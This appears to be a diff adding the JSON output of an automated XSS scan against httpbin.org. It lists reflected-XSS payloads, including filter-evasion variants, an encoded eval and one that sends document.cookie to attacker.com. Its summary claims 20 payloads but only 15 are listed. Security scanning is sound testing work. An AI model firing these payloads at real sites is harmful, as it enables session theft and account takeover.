@@ -1,0 +1,146 @@
+{
+  "tool": "xss_scan",
+  "timestamp": "20260710_115923",
+  "session_id": "test_validation_20260710_115837",
+  "inputs": {
+    "url": "https://httpbin.org/get",
+    "param": "q",
+    "method": "GET"
+  },
+  "outputs": {
+    "status": "success",
+    "target": "https://httpbin.org/get",
+    "parameter": "q",
+    "method": "GET",
+    "payloads_tested": 20,
+    "vulnerable": false,
+    "summary": {
+      "total_tested": 20,
+      "reflected": 0,
+      "vulnerable": 0
+    },
+    "vulnerable_payloads": [],
+    "all_results": [
+      {
+        "payload": "<script>alert('XSS')</script>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<img src=x onerror=alert('XSS')>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<svg onload=alert('XSS')>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<body onload=alert('XSS')>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<iframe src='javascript:alert(1)'>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "javascript:alert('XSS')",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "'-alert('XSS')-'",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "\"><script>alert('XSS')</script>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "'><script>alert('XSS')</script>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<ScRiPt>alert('XSS')</ScRiPt>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<<script>script>alert('XSS')<</script>/script>",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "<img src=\"x\" onerror=\"&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;\">",
+        "reflected": false,
+        "indicator_found": false,
+        "vulnerable": false,
+        "response_length": 155,
+        "confidence": "low"
+      }
+    ]
+  }
+}
